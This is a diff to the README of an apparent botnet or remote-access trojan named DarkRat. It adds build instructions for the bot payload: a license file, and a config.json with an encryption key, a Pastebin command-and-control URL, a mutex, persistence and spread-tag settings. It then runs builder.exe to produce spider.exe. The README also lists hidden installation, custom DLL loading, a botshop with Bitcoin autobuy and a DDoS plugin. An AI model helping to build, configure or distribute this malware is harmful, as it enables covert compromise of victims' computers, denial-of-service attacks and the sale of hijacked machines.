@@ -34,6 +34,48 @@ If anyone would like to support this project would be a new documentation with f
 $pdo = new PDO('mysql:host=localhost;dbname=darkrat', 'username', 'password');
 ```
 
+
+## Build a Bot
+
+- Create a License file named "darkrat.lic" and enter your License Key.
+- Create a file named "config.json" and enter your Gate Settings
+
+## Shortnames:
+- ek  =  Encryption Key (Lenght 32)
+- pu  =  Pastebin URL OR Direct Encrypted URL   
+```json
+{
+"pu": "keRwrh9WFcNrWnCLM96VuBRRMCYg/UPgRTb09A=="
+ }
+```
+- mux =  A Random Mutex
+- sup =  Startup true/false
+- ri  =  Request Interval in secounds
+- pre =  Running Persistence true/false
+- st  =  Spread Tag
+- ua  =  User Agent for Post Requests
+- pn  =  Some Example for DarkRat Developers
+
+
+## Full Config Example 
+```json
+{
+  "ek": "randomkey",                        
+  "pu": "http://pastebin.com/raw/random",                            
+  "mux": "3mCUq1z",                        
+  "sup": "false",                          
+  "ri":  "5",                              
+  "pre": "false",                           
+  "st": "main",                             
+  "ua":  "SUq1rx",                          
+  "pn":  { "FOO":"BAR" }                   
+ }
+```
+- Open the builder.exe and enter your username
+- Select create from Config File if you created one, if not select create from Terminal.
+- Finished. spider.exe is created, Backtest your payload on a VM.
+
+
 ### Panel
   - Template System based on [Smarty](https://www.smarty.net/)
   - Dynamic URL Routing 
@@ -45,7 +87,7 @@ $pdo = new PDO('mysql:host=localhost;dbname=darkrat', 'username', 'password');
   - Task Geo Targeting System 
   - Task Software Targeting System (for .net software)
 
-### Bot 2.1.1
+### Bot 2.1.3
   - Running Persistence
   - Startup Persistence
   - Installed hidden on the FileSystem 
@@ -53,7 +95,8 @@ $pdo = new PDO('mysql:host=localhost;dbname=darkrat', 'username', 'password');
   - Update
   - Uninstall
   - Custom DLL Loading
-
+  - Direct Connect or RAW forwarder (Like pastebin/gist also supported own plain/raw sites)
+  
 ### Included Plugins
   - Botshop with autobuy Bitcoin API
   - Alpha version of a DDOS (NOT STABLE)
